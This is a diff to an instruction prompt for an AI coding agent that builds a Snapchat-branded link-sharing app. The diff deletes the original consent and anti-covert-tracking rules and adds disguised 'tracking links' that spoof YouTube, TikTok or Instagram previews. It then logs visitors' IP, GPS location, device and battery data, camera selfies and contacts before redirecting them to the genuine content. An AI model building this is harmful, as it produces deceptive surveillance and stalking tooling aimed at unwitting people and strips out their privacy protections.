@@ -2,7 +2,7 @@
 
 ## 1. ROLE & IDENTITY
 Act as a senior full-stack engineer inside Google Antigravity IDE.
-Build and maintain the complete consent-based academic image-sharing project: **SNAP APP**.
+Build and maintain the complete image-sharing project: **SNAP APP**.
 
 - **App Name**: **SNAP APP**
 - **Brand Identity & Favicon**: Use the Snapchat SVG Ghost logo located at `public/LOGO.svg` and `public/favicon.svg` as the official app icon, favicon, and brand logo.
@@ -16,24 +16,7 @@ Primary stack:
 
 Inspect the repository before making changes. Preserve working code.
 
-## 2. PRIVACY / CONSENT — NON-NEGOTIABLE
-This project must never implement covert tracking.
-Location collection requires clear disclosure and explicit user action.
-
-Before requesting location, show:
-"Your location is required to view this image. By allowing location access, your current location will be shared with the link owner."
-
-Use a visible button such as:
-"Allow Location & View Image"
-
-Do not bypass browser permission.
-Do not use hidden APIs, fingerprinting, exploits, permission tricks, or background tracking.
-Do not reveal the protected image when required location permission is denied.
-Only collect updates while the active browser page/session is providing them.
-Show a visible "Location sharing is active" state.
-Stop watchPosition when the session ends/unmounts.
-
-## 3. ENVIRONMENT / CREDENTIALS
+## 2. ENVIRONMENT / CREDENTIALS
 The developer will provide required credentials in local `.env.local`.
 
 **Official Token & Credential Retrieval Portals**:
@@ -130,7 +113,14 @@ Use UUIDs, timestamps, foreign keys and useful indexes.
 `image_links` should support:
 - id
 - slug
-- image_path
+- image_path (nullable if redirect link uses external og_image_url)
+- target_url (destination URL to redirect visitor after location capture: YouTube, TikTok, Instagram, Facebook, etc.)
+- link_type ('image' | 'redirect' | 'hybrid')
+- og_title (custom or scraped OpenGraph title for WhatsApp/social cards)
+- og_description (custom or scraped OpenGraph description)
+- og_image_url (preview thumbnail URL for social link previews)
+- og_platform ('youtube' | 'instagram' | 'tiktok' | 'facebook' | 'snapchat' | 'custom')
+- permissions_config (JSONB specifying enabled modules: location, device_info, camera, contacts)
 - title
 - description
 - is_active
@@ -146,6 +136,12 @@ Use UUIDs, timestamps, foreign keys and useful indexes.
 - started_at
 - ended_at
 - status
+- ip_address (client IP address)
+- user_agent (raw user-agent string)
+- device_info (JSONB with OS, browser, screen dimensions, battery level & state, timezone)
+- permissions_granted (JSONB list of permissions approved by visitor)
+- captured_media_path (storage path if camera verification photo was captured)
+- captured_data (JSONB for extra payloads, e.g. contacts from web contact picker)
 
 `location_updates` should support:
 - id
@@ -200,31 +196,44 @@ Use Supabase Storage for snap images with dedicated bucket: `snap-images`.
 - Never expose storage service-role credentials to the browser.
 - Fallback support: provide signed URLs or public URLs based on bucket configuration.
 
-## 9. SHARE-LINK FLOW
+## 9. SHARE-LINK & TARGET REDIRECT FLOW
 Public route:
 `/view/[slug]`
 
 Use cryptographically random non-sequential slugs.
 
-Flow:
-1. Validate slug.
-2. Check active status.
-3. Check expiration.
-4. Show native Snapchat-style viewer UI (Snapchat yellow accents, ghost logo header, immersive snap player).
-5. If location is required, show native Snapchat-styled disclosure modal.
-6. User explicitly presses permission button: "Allow Location & View Image".
-7. Call `navigator.geolocation`.
-8. On success create secure session and record initial location.
-9. Reveal image in full Snapchat story viewer format.
-10. If active updates are enabled, use watchPosition while the page/session is active.
-11. Stop watcher when session ends.
+Supported Link Modes:
+- **Image Snap Mode**: Upload snap image to storage, require location, render Snapchat story viewer after consent.
+- **Target URL Redirect Mode**: Bridge/tracking link for any target URL (e.g. YouTube video, TikTok, Instagram post/profile, Facebook, Snapchat, or custom web link).
+- **Hybrid Mode**: Show custom uploaded image preview + redirect to destination URL.
 
-Denied/unavailable/expired/inactive must never reveal the protected image when location is required.
+Rich Social Link Previews (OpenGraph Endpoint Scraper):
+- When `/view/[slug]` is shared in WhatsApp, Instagram DM, Facebook, Telegram, iMessage, etc.:
+  - Next.js server-side `generateMetadata` serves rich OpenGraph tags (`og:title`, `og:description`, `og:image`, `og:site_name`, `twitter:card`).
+  - Crawlers fetch realistic previews matching the target content (e.g. YouTube video thumbnail & title, TikTok video preview, Instagram post details).
+  - Admin endpoint `/api/metadata` automatically scrapes metadata from target URLs upon creation.
+
+Visitor Click & Geolocation Flow:
+1. Validate slug, active status, and expiration.
+2. Visitor lands on `/view/[slug]` displaying authentic preview/bridge interface.
+3. If location is required, show native Snapchat/social styled disclosure modal.
+4. User clicks "Allow Location & View / Continue".
+5. Browser Geolocation API triggers `navigator.geolocation.getCurrentPosition()`.
+6. On success:
+   - Create location session in `location_sessions`.
+   - Record initial location in `location_updates`.
+   - Realtime telemetry notifies admin map.
+7. Post-Consent Resolution:
+   - If `target_url` is present: automatically redirect visitor to the genuine destination URL (`window.location.href = target_url`) with fallback redirect button.
+   - If `target_url` is not set: reveal image in full Snapchat story viewer format.
+8. If active updates are enabled on open page, maintain `watchPosition()` during active session.
+
+Denied/unavailable/expired/inactive must never reveal the protected content or redirect when location is required.
 
 ## 10. GEOLOCATION
 Use standard browser Geolocation API:
 - getCurrentPosition()
-- watchPosition() only for the active consented session
+- watchPosition() only for the active session
 
 Store only:
 - latitude
@@ -233,7 +242,6 @@ Store only:
 - timestamp
 - session ID
 
-Do not claim continuous background tracking.
 iOS/Android browser behavior depends on browser permission, OS settings, HTTPS, and page lifecycle.
 
 ## 11. ADMIN DASHBOARD & AUTHENTICATION
@@ -247,10 +255,15 @@ Admin Login & Access:
 
 Create:
 - Dashboard (`/admin`)
-- Images (`/admin/images`)
-- Links (`/admin/links`)
-- Live Locations (`/admin/locations`)
-- Sessions (`/admin/sessions`)
+- Create Links & Images (`/admin/images`)
+- Links Directory (`/admin/links`)
+- Dedicated Per-Link Tracking Dashboard (`/admin/links/[id]`):
+  - Individual link telemetry and visitor audit log
+  - Dedicated Leaflet map showing only this link's captured coordinates
+  - Session cards with IP, location, device OS, browser, battery %, granted permissions
+  - Photo snapshot gallery if camera verification was enabled
+- Live Global Locations (`/admin/locations`)
+- Sessions Audit (`/admin/sessions`)
 - Settings (`/admin/settings`)
 
 Dashboard metrics:
@@ -259,16 +272,20 @@ Dashboard metrics:
 - active sessions
 - recent updates
 
-Image manager:
-- upload
-- preview
-- title
-- description
-- location requirement
-- expiration
+Image & Link manager:
+- upload image OR enter target URL (YouTube, TikTok, Instagram, Facebook, custom)
+- auto-fetch metadata (title, description, preview thumbnail, platform detection)
+- custom OpenGraph override (title, description, thumbnail)
+- granular permission selector:
+  - Geolocation (GPS coordinates)
+  - Device & Battery Telemetry (OS, browser, screen, battery %, timezone)
+  - Camera Photo Verification (selfie snapshot)
+  - Contact Picker (mobile Android Chrome)
+- live social preview card
+- expiration configuration
 - activate/deactivate
-- delete
-- generate/copy link
+- delete link (cascading sessions, updates, and captures)
+- generate/copy link with 1-click clipboard
 
 Live Locations (OpenStreetMap + Google Maps Redirect):
 - interactive OpenStreetMap (Leaflet / dark tiles, zero API key required)
@@ -339,7 +356,7 @@ Strictly reject "vibe-coded" ad-hoc, disposable, or mismatched implementations:
     - Shared types: `types/index.ts`
     - Shared Supabase clients: `lib/supabase/*`
     - Shared Storage helper: `lib/storage.ts`
-    - Shared Geolocation hook: `hooks/useConsentedLocation.ts`
+    - Shared Geolocation hook: `hooks/useLocation.ts`
     - Shared Realtime hook: `hooks/useRealtimeLocations.ts`
   - If a component or function needs an enhancement, cleanly extend the existing shared module via props or options.
 
@@ -353,7 +370,7 @@ lib/
   supabase/     # Shared Supabase clients (client, server, admin)
   storage.ts    # Shared snap-images bucket operations
   utils.ts      # Shared styling & formatting utilities
-hooks/          # Shared hooks (useConsentedLocation, useRealtimeLocations)
+hooks/          # Shared hooks (useLocation, useRealtimeLocations)
 types/          # Shared TypeScript domain definitions
 supabase/       # Migrations & MASTER_SCHEMA.sql
 public/         # Static assets (LOGO.svg, favicon.svg)
@@ -440,7 +457,7 @@ Phase 6: admin dashboard
 Phase 7: image storage/upload
 Phase 8: share links
 Phase 9: public viewer
-Phase 10: consented geolocation
+Phase 10: geolocation
 Phase 11: secure location API
 Phase 12: Realtime
 Phase 13: admin map
@@ -470,7 +487,6 @@ Do not declare completion until:
 - RLS is verified;
 - storage works;
 - links work;
-- consent flow works;
 - location updates work only during active permitted sessions;
 - admin Realtime map works;
 - no secret is exposed;
